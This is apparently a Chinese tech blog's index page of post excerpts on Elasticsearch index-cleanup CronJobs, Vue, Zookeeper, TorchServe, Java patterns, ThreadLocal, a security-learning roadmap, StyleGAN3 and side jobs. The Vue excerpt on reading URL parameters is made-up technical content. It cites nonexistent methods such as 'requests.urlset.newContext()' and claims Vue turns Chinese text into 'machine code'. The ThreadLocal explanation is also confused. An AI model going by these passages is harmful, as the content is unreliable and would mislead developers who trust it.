创建两个定时任务，一个定时任务在删除ES索引前执行，用于核对和审计定时任务删除的索引；另一个是关键的定时任务，用于删除ES历史数据。第一个定时任务可以根据实际情况选择性决定是否要创建。（当然你也可以直接把两个任务合并到一起，将两句curl命令完整内容作为command的参数，两句curl要使用分号 或者 &amp;&amp; 连接）
三、实现操作 1、获取ES索引信息 获取ES索引定时任务编排文件: elastic-get-indeices.yaml
apiVersion: batch/v1beta1 kind: CronJob metadata: annotations: description: "先获取一次索引信息，然后再删除索引；以便核对每次删除的索引" labels: app: elastic-get-indeices name: elastic-get-indeices spec: concurrencyPolicy: Forbid failedJobsHistoryLimit: 5 schedule: "0 0 * * *" jobTemplate: metadata: labels: app: elastic-get-indeices spec: activeDeadlineSeconds: 360 backoffLimit: 3 completions: 1 parallelism: 1 template: metadata: annotations: kubesphere.io/imagepullsecrets: '{}' spec: containers: - command: - /bin/sh - -c - curl -XGET -u ${esuser}:${espass} ${esurl}/_cat/indices | sort -k 3 env: - name: esuser value: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/886de13ef9f0c28fa87954244ded3a18/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1ed7750dac22b2fc7726eb217249cecb/" rel="bookmark">
			vue 获取url地址的参数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		url是一个 URL地址，我们在使用 vue的时候，经常需要获取 url的参数，获取方法有很多种，这里我只介绍一种获取 url参数的方法，那就是使用 Requests. urlset. newContext （）方法。 这个方法就是调用 requests. urlset. newContext （）方法来获取 url的参数。在这个方法中，我们需要注意以下几点： 1、 vue提供了一种称为 requests. urlset.request_name （）的方法。 3、在获取到参数之后，可以使用 setTimeout （）和 setInterval （）函数来进行数据的刷新。 4、如果传入的参数是中文字符串，则需要将其转化为机器码再进行刷新。 6、当传入的参数是字符串时，可以使用 drawRow （）函数来获取。
1.获取 url参数
我们可以看到，当我们调用了这个方法之后，首先会获取一个 url的参数，然后进行解析，并将解析出的 url的参数赋给 newContext （）函数。 在上面的代码中，我们通过 public static void requests （）方法获取到了 url的参数，并将其赋给了 newContext （）函数。 下面是两个函数的具体用法：
2.数据刷新
下面我们就分别用这两个函数来实现。 setTimeout （）函数会在获取到 url的参数后，判断参数是否存在于 DOM中，如果不存在，则会将其转化为机器码再进行刷新；如果存在，则会将其转化为机器码再进行刷新。在这里，我们可以看到两种数据刷新的方式： 使用 datetime （）方法来对数据进行刷新。 这里，我们可以看到 setInterval （）函数的返回值是一个数组，其中包含了一个 chunk （）方法。
3.中文字符串的转化
下面是一个简单的例子： 通过这个例子，我们可以看出， vue会将字符串中的汉字转化为机器码，然后再进行刷新。 这里要注意的是， Vue不能直接将中文字符串中的数字转换为机器码。在 vue中，我们可以使用 replace （）函数来实现字符串与机器码之间的转换。例如： 例如： 上面这个例子中，我们将数字和中文字符串转化为机器码之后，然后再使用 setInterval （）函数进行刷新。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1ed7750dac22b2fc7726eb217249cecb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fb4ac192a5f039c2e2c335ba5ced3583/" rel="bookmark">
			Zookeeper
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1. Zookeeper工作机制 Zookeeper是一个机遇观察者模式设计的分布式服务管理框架，它负责存储和管理大家都关心的数据，然后接受观察者的注册，一旦这些数据的状态发送变化，Zookeeper就将负责通知已经在Zookeeper上注册的那些观察者做出相应的反应。
2. 安装ZK服务端 安装步骤请参照：好好聊聊Docker 23.1 安装ZK服务端 3. 通过客户端连服务端 步骤请参照：好好聊聊Docker 23.2 通过客户端连服务端 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a25758a08c28d8697f9fa0e1d360cb8e/" rel="bookmark">
			SpringBoot RestTemplate Post请求乱码问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		这定义目录标题 RestTemplate 默认请求编码是8859-1,所以中文会显示乱码Alt如何插入一段漂亮的代码片生成一个适合你的列表创建一个表格设定内容居中、居左、居右SmartyPants 创建一个自定义列表如何创建一个注脚注释也是必不可少的KaTeX数学公式新的甘特图功能，丰富你的文章UML 图表FLowchart流程图导出与导入导出导入 RestTemplate 默认请求编码是8859-1,所以中文会显示乱码 创建一个修改默认编码的 RestTemplate
创建一个RestTemplate ，修改默认编码为 utf-8,框架默认为 iso-8859-1
@Configuration
public class RestTemplateConfig {
@Bean public RestTemplate initRestTemplate(){ RestTemplate restTemplate= new RestTemplate(); restTemplate.getMessageConverters().set(1,new StringHttpMessageConverter(StandardCharsets.UTF_8)); return restTemplate; } }
使用方式
@Autowired
private RestTemplate restTemplate;
带尺寸的图片: 居中的图片: 居中并且带尺寸的图片: 当然，我们为了让用户更加便捷，我们增加了图片拖拽功能。
如何插入一段漂亮的代码片 去博客设置页面，选择一款你喜欢的代码片高亮样式，下面展示同样高亮的 代码片.
// An highlighted block var foo = 'bar'; 生成一个适合你的列表 项目 项目 项目 项目1项目2项目3 计划任务 完成任务 创建一个表格 一个简单的表格是这么创建的：
项目Value电脑$1600手机$12导管$1 设定内容居中、居左、居右 使用:---------:居中
使用:----------居左
使用----------:居右
第一列第二列第三列第一列文本居中第二列文本居右第三列文本居左 SmartyPants SmartyPants将ASCII标点字符转换为“智能”印刷标点HTML实体。例如：
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a25758a08c28d8697f9fa0e1d360cb8e/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a7dfa8de6415653ee972f55f759d739a/" rel="bookmark">
			【torchserve安装和使用】torchserve部署方法|常见问题汇总|mmdetection使用torchserve部署|不使用docker
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		QQ：1757093754 欢迎交流！！！ 什么是torchserve？ （百度）torchserve是Facebook和AWS联手开发的一款用于机器学习模型部署和调用的微服务程序。
接触torchserve是因为项目落地最终需要部署到平台上面，所以就开始了torchserve的使用之旅。
安装方法： pip3 install torchserve -i https://pypi.tuna.tsinghua.edu.cn/simple torchserve官网： 1. TorchServe — PyTorch/Serve master documentationhttps://pytorch.org/serve/
环境依赖：（建议） torch==1.9.x
openjdk==11
python==3.8
个人学习安装、使用torchserve： 1.安装虚拟机 对于模型的部署，torchserve支持windows，但是我们最好在linux下面进行练习，大部分的项目落地都以linux为主。
下载一个linux虚拟机必不可少：
（centos）
• 第一步：下载 VMware Workstation • 第二步：下载centos系统镜像 • 第三步：安装系统镜像到虚拟机 Windows 虚拟机 | Workstation Pro | VMware | CNhttps://www.vmware.com/cn/products/workstation-pro.html 镜像下载链接： CentOS 安装镜像 · ISRC - 镜像站 (iscas.ac.cn)https://mirror.iscas.ac.cn/mirror/centos-release.html将下载好的iso镜像安装到虚拟机里面：
在虚拟机打开终端：
2.安装anaconda 和我们平时使用一样，我们需要一个包管理工具去管理我们下载好的包和库。
wget https://mirrors.tuna.tsinghua.edu.cn/anaconda/archive/Anaconda3-2021.05-Linux-x86_64.sh 注意：这里的anaconda版本可以随意，最好保证不要太新，也不要太旧就行。
注：图中的anaconda是我已经安装完成的，正常下载完了只有旁边那一个.sh文件。 之后执行.sh文件实现安装：
bash Anaconda3-2021.05-Linux-x86_64.sh 注意：安装的时候仔细看给的提示英文，不要盲目的一路回车过去！！！ 报错：Cannot open xxx/anaconda3/conda.exe or archive xxx/anaconda3/conda.exe.pkg
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a7dfa8de6415653ee972f55f759d739a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2d35f22db9dd8c291f88c38c2b1a6eff/" rel="bookmark">
			UnicodeDecodeError: ‘gbk‘ codec can‘t decode byte 0x98 in position 1093: illegal multibyte sequence
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		不是你是否也遇到了这个报错。
如果有，那么你来对地方了，一次性永久解决该问题。
如果没有，也可停下来看一看，以便以后更好的解决可能会出现的问题。
目录
事情的起因
原因分析
解决方法
综述
事情的起因 这是在用python安装第三方库的时候遇到的问题，例如：pip install XXX
以前都没有问题的，知道有一次，出了这个问题，但是不记得自己改过有关编码的设置啊啊，，，
于是~~~
我开始满浏览器的搜，当然，也搜到了很多解决办法。
例如：
根据报错位置，一步一步往前索引，直到找到打开文件的地方，把encoding=参数设置成‘utf8’，或者是其他的中文字符集（啥样的都有）。
重新安装pip。。。
重新设置系统默认的编码字符集。。。
注：以上方法均不建议尝试。
一是不能从根本上解决问题。
二是有的方法根本解决不了问题。
原因分析 废话不多说，开始正题：
原因是系统的编解码方式的问题（因为我尝试过，把pip重装一遍还是解决不了问题【当时还怀疑是依赖冲突，于是我把anaconda重新装了一遍~~~】，但是都没有解决问题）
所以！！！
我们需要改变系统的编解码方式。
解决方法 添加环境变量
如图所示：在系统环境中加入以下变量。
最后一步：重启电脑！（不重启不会生效）
综述 不要太多的去修改库的源代码，不是长久的做法，也不一定正确，除非是操作系统的原因。
QQ：1757093754
欢迎交流！学习！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1a0ce488903ba348d0a4a8d7d2a36b73/" rel="bookmark">
			Java设计模式-命令模式
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		简介 在软件开发领域，设计模式是解决常见问题的可复用解决方案。其中，命令模式是一种常用的设计模式，它提供了一种将请求封装为对象的方式，使得我们能够根据需要将请求参数化、队列化或记录日志，以及支持可撤销操作。
命令模式是一种行为设计模式，它将请求封装为一个对象，从而使得我们可以根据需要参数化、队列化或记录请求，并支持可撤销操作。该模式包括以下几个主要角色：
命令接口（Command Interface）：声明执行操作的接口。具体命令（Concrete Command）：实现命令接口，并将一个接收者与一个操作绑定。调用者（Invoker）：调用命令对象并触发操作。接收者（Receiver）：执行命令所要求的操作。 命令模式与其他设计模式有着明显的区别：
与策略模式：命令模式将请求封装为对象，并提供了队列化和撤销操作的支持，而策略模式则通过切换不同的算法来达到不同的行为。与观察者模式：命令模式通过将请求者和接收者解耦，而观察者模式则通过发布-订阅机制实现对象之间的松耦合。与模板方法模式：命令模式将请求封装为一个对象，由调用者决定如何执行命令，而模板方法模式则由基类控制算法的骨架。 实现 下面是一个使用Java编程语言实现命令模式的示例代码：
// 命令接口 interface Command { void execute(); } // 具体命令 class ConcreteCommand implements Command { private Receiver receiver; ConcreteCommand(Receiver receiver) { this.receiver = receiver; } public void execute() { receiver.action(); } } // 接收者 class Receiver { void action() { System.out.println("执行操作"); } } // 调用者 class Invoker { private Command command; void setCommand(Command command) { this.command = command; } void executeCommand() { command.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1a0ce488903ba348d0a4a8d7d2a36b73/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e8a27ef989cb95f86919402d74b0545a/" rel="bookmark">
			将本地项目代码上传到 Gitee
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 1.在 Gitee 上创建一个新的仓库。 2.打开命令行或者终端，进入本地项目所在的文件夹。 3.初始化 Git 仓库：使用命令 git init 初始化一个 Git 仓库。 4.添加本地代码文件到缓存区：使用命令 git add . 将所有文件添加到 Git 缓存区。 5.提交代码到本地仓库：使用命令 git commit -m "提交说明" 将缓存区的代码提交到本地仓库，并附上简短的提交说明。 6.关联远程仓库：使用命令 git remote add origin https://gitee.com/你的用户名/仓库名.git 将本地仓库与 Gitee 上的远程仓库关联起来。 7.推送代码到远程仓库：使用命令 git push -u origin master 将本地仓库中的代码推送到 Gitee 远程仓库。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7dddd1eb83ffd7dfa430f7efd1adb64d/" rel="bookmark">
			自学黑客（网络安全），一般人我劝你还是算了吧
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、网络安全学习的误区 1.不要试图以编程为基础去学习网络安全 不要以编程为基础再开始学习网络安全，一般来说，学习编程不但学习周期长，且过渡到网络安全用到编程的用到的编程的关键点不多。一般人如果想要把编程学好再开始学习网络安全往往需要花费很长时间，容易半途而废。建议在学习网络安全的过程中，哪里不会补哪里，这样更有目的性且耗时更少。学习编程能决定你能在网络安全这条路上到底能走多远，所以推荐大家自学一些基础编程的知识
2.不要刚开始就深度学习网络安全 学习讲究这方法，需要一步一步的来，由浅至深，慢慢的加大难度，很多人刚开始就猛学，很容易到后面的时候乏力，越学可能就越学得枯燥，到最后就很容易放弃了。
3.收集适当的学习资料 网上有很多网络安全的学习资料。而很多朋友都有“收集癖”，一下子很多书籍，收藏几十个视频，觉得学习资料越多越好，然而网上的学习资料重复性极高。建议选择大众受用的学习资料。
4.适当的报班学习 很多人觉得报班就是浪费钱财，觉得自己自学就很好了，但其实自学也是需要一定的天赋和理解能力，且自学的周期较长，一些急躁的学习者或者急于找到工作的学习者，还是报班学的比较轻松，学习周期不长，学到的东西也不会少，建议学习者根据自己的自身条件选择是否报班。
二、学习网络安全的前期准备 1.硬件选择 学习网络安全不需要配置很高的电脑，黑客用的电脑,从来不是根据高配置选择电脑,只要稳定就行。因为黑客所使用的一些程序,低端 CPU 也可以很好的运行,而且不占什么内存。黑客是在 DOS 命令下对进行的,电脑能使用到最佳状态就可以了。
2.软件选择 很多人会纠结学习黑客到底是用 Linux 还是 Windows 或者是 Mac 系统，Linux 系统对于新人入门并不友好。Windows 系统一样可以用虚拟机装靶机进行学习，当然是根据学习者自己的感觉来选择系统。
至于编程语言，Python、PHP、 C++、Java 都是可以的，学习编程只是工具不是目的，我们的目标不是成为程序员，而是成为网络安全员，编程只是为了看懂程序。
3.外语能力 计算机最早诞生于宾西法利亚大学，很多名词或者代码都是英文，一个漏洞翻译成中文需要一个星期的时间，在这个时间上漏洞可能都修补了。如果不理解一些专业名词，在与其他黑客交流时也会有障碍，所以需要一定量的英文量和了解一些专业名词。
4.基础操作入门 入门的第一步是学习一些当下主流的安全工具课程并配套基础原理的书籍，一般来说这个过程在 1 个月左右比较合适。
5.学习基础知识 在这个阶段，你已经对网络安全有了基本的了解。如果你认真学习完第一步，什么是 sql 注入，什么是 xss 攻击这些已经都明白了，对 burp、cs 等安全工具也掌握了基础操作。这个时候最重要的就是开始打地基！所谓的“打地基”其实就是系统化的学习计算机基础知识
6.实战操作 1.挖 SRC
挖 SRC 的目的主要是讲技能落在实处，学习网络安全最大的幻觉就是觉得自己什么都懂了，但是到了真的挖漏洞的时候却一筹莫展，更多的还是要进行实操，把理论知识运用到实践中，确保更好的掌握知识点。
2.从技术分享帖学习
观看学习近十年所有挖掘的帖，然后搭建环境，去复现漏洞，去思考学习笔者的挖洞思维，培养自己的渗透思维。
三、渗透测试学习路线 一、基础部分 基础部分需要学习以下内容：
1.计算机网络 ：
重点学习 OSI、TCP/IP 模型，网络协议，网络设备工作原理等内容，其他内容快速通读
2.Linux 系统及命令
由于目前市面上的 Web 服务器 7 成都是运行在 Linux 系统之上，如果要学习渗透 Web 系统，最起码还是要对 linux 系统非常熟悉，常见的操作命令需要学会
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7dddd1eb83ffd7dfa430f7efd1adb64d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/299b1ccc85f5e0d3cb1ca5fbe87350ce/" rel="bookmark">
			js中数组push对象，前面的值总是被最后一次的值覆盖的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		可能是因为在push对象时，每次都是将同一个对象的引用添加到数组中，而不是不同的对象。这意味着每次修改这个对象时，数组中的所有引用都会反映这个更改。要解决这个问题，可以在每次push对象时，创建一个新的对象，而不是只是引用同一个对象。例如：
let arr = []; let obj = {name: 'John'}; arr.push(Object.assign({}, obj)); // 创建一个新对象并将其添加到数组中 obj.name = 'Sarah'; // 修改原始对象 arr.push(Object.assign({}, obj)); // 再次创建一个新对象并添加到数组中 这将确保每个对象都是独立的，而不会被其他对象的更改所影响。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/554d589406fc2e840863a6c2503379ce/" rel="bookmark">
			【28】面试官常问：为什么数据库连接池要用 ThreadLocal 呢？不用会怎么样？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 这个问题我疑问了很久很久，主要如下截图。
我先说为什么引入threadlocal，其实是为了解决数据库事务，而事务是和连接有关的，每个连接对应一个事务，多个连接的事务是不一样的，先大概了解一下，往下看👇
本人是在学threadlocal的时候，网上大部分人都是说数据库连接池是典型的用了threadlocal的例子，然后我就又查数据库连接池和threadloca的关系，但是，99%都说threadlocal是为了在并发的情况下，为了保证线程安全，创建了副本什么的，其实这只是threadlocal的用法之一，它还有个用法就是确保同一线程之间参数传递的方便（扯远了）
回归正题，还是拿上面的图来说事！ 我只讲两个关键点，明白人一看就懂：
1、两者有根本性的区别，用处不一样！
连接池是缓存并托管数据库连接，主要是为了提高性能。
而ThreadLocal缓存连接，是为了把同一个数据库连接“分享”给同一个线程的不同调用方法。（不管调用哪个方法，都是使用的同一个连接，方便进行“跨方法”的事务控制）
举个栗子：
如果一个请求中涉及多个 DAO 操作，而如果这些DAO中的Connection都是独立的话，就没有办法完成一个事务。但是如果DAO 中的 Connection 是从 ThreadLocal 中获得的（意味着都是同一个对象）， 那么这些 DAO 就会被纳入到同一个 Connection 之下。
2、重点要理解“连接池”。
连接池里面有一定数量的连接资源，比如最大20个连接。
题外话：如果直接通过 Java原生API 获取“直连”的话：
（底层方法一般都是这样写的：
java.sql.DriverManager.getConnection(url, props); java.sql.Driver.connect(url, props); 特点是：要传入url、用户名和密码等信息）
这种方式，肯定就没有使用数据库连接池。
使用数据库连接池，通常都是得到一个所谓的javax.sql.DataSource[接口]的实例对象，它里面包含了Connection，并且数据库连接池工具类（比如C3P0、JNDI、DBCP等），肯定是重新定义了getConnection、closeConnection等方法，所以你每次得到的Connection，几乎都不是新建立的连接（而是已经建立好并放到缓存里面的连接），你调用closeConnection方法，也不是真正的关闭连接（一般都是起到一个标识作用，标识当前连接已经使用完毕，归还给连接池，让这个连接处于待分配状态）【PS：所以说：使用数据库连接池时，还是要显式的调用数据库连接池API提供的关闭连接的方法】。
理解一下这句话：
不同的线程在同一个时间（ 或者 同一个线程在多个地方）从连接池中拿到的Connection，肯定不是同一个连接。（反过来讲：不同时间的两个线程，一前一后，则有可能拿到同一个连接）
总结： 再好好理解一下上面的一段话，我再最后解释亿下
首先，我们为了避免单一数据库连接的创建和关闭耗费时间和性能，引入了数据库连接池，提前创建好了n条连接放入池中，如果是单线程情况下，那这样挺好的
那如果是多线程情况下呢？还是上面那段话，假设同一时间多个线程从数据库连接池获取连接，那肯定拿的是不同的连接，我当前线程和别的线程拿的连接不一样，那我当前在crud的时候，不在一个事务之内。
假设不同时间的多个线程要从数据库连接池拿连接，那这个时候就可能拿到的是同一个连接了，那我多个线程线程拿到的是同一个连接，也就是说在多个线程在同一个事务之内，线程a执行了插入还没来得及提交，线程b此时来了个更新，在线程a还未操作完之前，线程b更新完了后，直接把连接给close了，线程a插了一半发现插不了了。。。此时肯定在想，这™是谁在搞我。
为了确保不同时间多个线程可能拿到的是同一个连接，那么此时threadlocal闪亮登场，就算我拿的是“同一个连接”，在引入了threadlocal后，每个线程之间都会创建独立的连接副本，将collection各自copy一份，这样就互相不干扰了。
为帮助开发者们提升面试技能、有机会入职BATJ等大厂公司，特别制作了这个专辑——这一次整体放出。
大致内容包括了： Java 集合、JVM、多线程、并发编程、设计模式、Spring全家桶、Java、MyBatis、ZooKeeper、Dubbo、Elasticsearch、Memcached、MongoDB、Redis、MySQL、RabbitMQ、Kafka、Linux、Netty、Tomcat等大厂面试题等、等技术栈！ 需要获取以下这些面试题答案以及学习资料得话麻烦关注+好评之后
直接点击此链接→【点我直接获取】 即可免费获取哦~~
看完三件事❤️ 如果你觉得这篇内容对你还蛮有帮助，我想邀请你帮我三个小忙：点赞，转发，有你们的 『点赞和评论』，才是我创造的动力。关注作者公众号 『 java烂猪皮 』，不定期分享原创知识。关注后回复【666】扫码即可获取学习资料包。同时可以期待后续文章ing🚀。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/32869ac6b00d5e425df27d605fc2d48a/" rel="bookmark">
			How to Install Android Studio under Ubuntu 16.04
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		If you find difficulties installing Android Studio under Ubuntu 16.04.1 LTS (Xenial Xerus), you can follow this tutorial that will show you simple commands needed for the installation of the software.
如果发现在Ubuntu 16.04.1 LTS（Xenial Xerus）下安装Android Studio遇到困难，则可以按照本教程进行操作，该教程将向您显示安装该软件所需的简单命令。
As you know, Android Studio is a platform used by developers to create apps and games for smartphones and tablets running the Android OS.
如您所知，Android Studio是开发人员用来为运行Android操作系统的智能手机和平板电脑创建应用和游戏的平台
Android Studio Installation To install Android Studio under Ubuntu 16.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/32869ac6b00d5e425df27d605fc2d48a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4d85e494419a365bcbe5b87b9c2d5692/" rel="bookmark">
			Screencasting/Mirroring an Android Device Screen onto your Desktop under Ubuntu/Linux Mint
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		In this tutorial, we will see how to control any Android device remotely on your Ubuntu/Linux Mint desktop using both your mouse and keyboard. To do this, we will use the Seven Square tool which will allow you to view your Android device (smartphone, tablet, etc.) screen directly on your computer or laptop.
在本教程中，我们将了解如何使用鼠标和键盘在Ubuntu / Linux Mint桌面上远程控制任何Android设备。 为此，我们将使用Seven Square工具，该工具可让您直接在计算机或笔记本电脑上查看Android设备（智能手机，平板电脑等）的屏幕。
With your keyboard or mouse, you will be able to control your device remotely without the need to tap on the screen of your Android device.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4d85e494419a365bcbe5b87b9c2d5692/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/48ea28425c17e63db55ebfd6e6500203/" rel="bookmark">
			（2021，StyleGAN3）无失真（Alias-Free）生成对抗网络
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Alias-Free Generative Adversarial Networks
公众号：EDPJ
目录
0. 摘要
1. 简介
2. 通过连续信号解释的等变性（equivariance）
2.1 等变网络层
3. 在生成网络中的实际应用 3.1 傅里叶特征和基线简化（配置 B–D）
3.2 由连续解释驱动的逐步重新设计
4. 结果
5. 局限性、讨论和未来工作
参考
S. 总结
S.1 核心思想
S.2 网络结构
0. 摘要 我们观察到，尽管具有层次卷积性质，典型的生成对抗网络的合成过程以不健康的方式依赖于绝对像素坐标。 这表现为，例如，细节似乎粘在图像坐标上，而不是所描绘物体的表面。 我们将根本原因追溯到导致生成器网络失真的粗心信号处理。 将网络中的所有信号解释为连续信号，我们得出普遍适用的小架构更改，以确保不需要的信息不会泄漏到分层合成过程中。 生成的网络与 StyleGAN2 的 FID 相匹配，但它们的内部表示存在显着差异，并且即使在亚像素尺度上，它们也完全等同于平移和旋转。 我们的结果为更适合视频和动画的生成模型铺平了道路。
1. 简介 在现实世界中，不同尺度的细节倾向于分层变换。 例如，移动头部会导致鼻子移动，进而移动其上的皮肤毛孔。 典型的 GAN 生成器的结构是类似的：粗糙的、低分辨率的特征通过上采样层分层细化，通过卷积局部混合，并通过非线性引入新的细节。 我们观察到，尽管有这种表面上的相似性，但当前的 GAN 架构并没有以自然的分层方式合成图像：粗特征主要控制更精细特征的存在，而不是它们的精确位置。 相反，许多细节似乎都固定在像素坐标中。 这种令人不安的“纹理粘附”在隐空间插值中清晰可见（参见图 1 和我们在项目页面上的随附视频），打破了在空间中移动的固体和连贯物体的错觉。我们的目标是展示更自然的转换层次结构 ，其中每个特征的确切子像素位置完全继承自底层粗糙特征。
事实证明，当前网络可以通过图像边界、每像素噪声输入和位置编码以及混叠（或失真），利用中间层可获得的非故意位置参考，部分绕过理想的分层结构。失真尽管是一个微妙而关键的问题，但在 GAN 文献中却很少受到关注。 我们确定了它的两个来源：1）由非理想的上采样滤波器（例如最近邻、双线性的或跨步的卷积）产生的像素网格的微弱残像（faint after-images），以及 2）非线性的逐点应用，例如 ReLU 或 swish。 我们发现网络有办法和动机来放大哪怕是最轻微的失真，并将其组合到多个尺度上，使其能够为屏幕坐标中固定的纹理图案奠定基础。 这适用于深度学习中常用的所有滤波器，甚至是图像处理中使用的高质量滤波器。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/48ea28425c17e63db55ebfd6e6500203/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8606b1fdbe8b3796873998bcb7011d4b/" rel="bookmark">
			Ubuntu虚拟机安装常用软件
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		还是安装常用软件系列
1. VMWare 安装Ubuntu 默认都安装完了，如果虚拟机安装时界面太小显示不全无法进行，那么先选试用Ubuntu，然后进入系统修改显示器分辨率，调大一些，再点击桌面上的安装Ubuntu图标。
2. 安装VMWare Tools VMWare虚拟机菜单，安装VMWare Tools
进入光驱，复制tar.gz文件到主目录，解压
命令行进入解压后目录执行
sudo ./vmware-install.pl
有是否选项的地方全选yes，no也输入yes，其余直接回车，安装完成后，重启虚拟机
3. 换源 更新源
sudo apt update
安装vim
sudo apt install -y vim
修改源 sudo vim /etc/apt/sources.list
全部注释掉 添加清华源
deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse
# deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse
deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse
# deb-src http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse
deb http://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8606b1fdbe8b3796873998bcb7011d4b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/512e76a35dc0f06aa3a2a6b6f5c5a7f3/" rel="bookmark">
			赚钱的副业有哪些?这篇我希望你们都能看到！！
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、爬虫 很多人入门 Python 的必修课之一一定是 Web 开发和爬虫，但这两项要想赚到钱，就必须知道该开发什么或该去爬什么数据能赚到钱。如果你都不知道的话问题也不大，可以考虑自己开一个淘宝网店或猪八戒做服务外包。
很多人可能会觉得开淘宝店很困难，其实不然，我在13年刚毕业那会儿就开过，没有投一分钱流量广告，做到了「数据抓取」类似关键词下的第一排展示位，而且还是利用周末或工作日晚上闲着无聊的时候干的，月流水1w左右纯当外快了。
收费定价全看自己心情，很多客户还觉得我这边物美价廉。其实我做了很多通用化的爬虫设计，比如那时候需求量很大的新浪微博数据，针对性开发了一套比较完整的爬虫系统（各种反爬取、IP代理池、Cookie/UA池等等）。
后来我才知道，我凭借这个配几个参数喝杯咖啡等上半小时就能搞定的需求，对外报价差不多是 100-200 元，隔壁家要在 600 元以上，这就是你在淘宝生存下去的硬实力。
在这个阶段最重要的还是要找到一个好的项目，比如最舒服的就是帮一些证券大佬抓取一些财经新闻、龙虎榜和舆情相关数据，开发完之后每个月只要保证爬虫不挂就可以收 3-5k，自己买个云主机一个月只要两三百的成本，还可以用来帮自己干别的事情，直到老板说不做这个项目了……
（进阿里后小二是不让开店的，且这个店本来就很久没接单了所以已经注销释放了，各位看官就不用去搜了）
2、量化交易 只要不涉及高频交易（HFT），用 Python 来完成量化交易相关工作内容实在是太方便了。当然了，做投资肯定是会有风险的，所以使用不当也很容易让你亏钱。
对于新手而言，我比较推荐 JoinQuant（ @JoinQuant 有没有广告费？），新手教程和在线 Python 策略开发环境我个人认为都是比较友好的。做 Quant 其实就是一个做数据挖掘的过程，不同的策略就是你手头能用的模型，选股、择时、资金管理就是你所要做的特征工程。
特征工程决定了你最多能赚到多少，模型则是用来逼近这个上限。举个比较极端的例子，假设你选了一只天天跌停的股，不管你怎么调整模型，必然都是无法在单边交易中赚到钱的，所以大家不必纠结到底是用均线策略还是用 BOLL，找到策略适应的股和择时才是关键，剩下就不展开了。
要追求稳定盈利的话可以考虑去各大虚拟币交易市场搬砖，编程能力较弱的同学可以考虑一下 botvs。统计套利虽然也能稳定盈利但显然不适合个人了，一般需要 HFT 支持。
3、程序代写/外包 互联网灰产真的是无处不在，我所认为的灰产就是不违法，但是有违道德的一些事情。
比如淘宝上有不少代做程序设计的，价美物廉，几百块就能搞一套基于 LAMP 的 xx 管理系统，看看买家评论就会知道，绝大部分都是学生的大作业或者毕业设计。
